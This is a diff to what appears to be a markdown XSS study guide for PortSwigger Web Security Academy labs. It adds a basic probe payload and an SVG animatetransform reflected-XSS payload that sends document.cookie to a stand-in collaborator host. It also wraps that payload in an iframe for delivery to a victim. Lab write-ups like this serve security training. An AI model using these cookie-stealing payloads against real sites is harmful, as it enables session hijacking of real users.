@@ -184,8 +184,14 @@
 >Set a test unsecure cookie in browser dev tools to test POC XSS cookie stealer payload on myself.  
 
 ```JavaScript
-document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
+document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
+```  
+  
+>Basic XSS Payloads to ***identify*** application controls for handling data received in HTTP request.   
+
 ```
+<img src=1 onerror=alert(1)>
+```  
   
 ### XSS Tags & Events  
 
@@ -247,7 +253,23 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 ```html
 <iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
+  
+>Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG markup allowed using above methodology. This payload steal my own session cookie as POC.  
 
+```
+https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+```  
+
+Take above payload to exploit server and insert into iframe before delivering to victim in below code block.  
+
+```html
+<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"></iframe>
+```  
+  
+![svg animatetransform XSS](images/svg-animatetransform-xss.png)  
+  
+[PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
+  
 ### Reflected XSS (Cookie Stealers)  
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
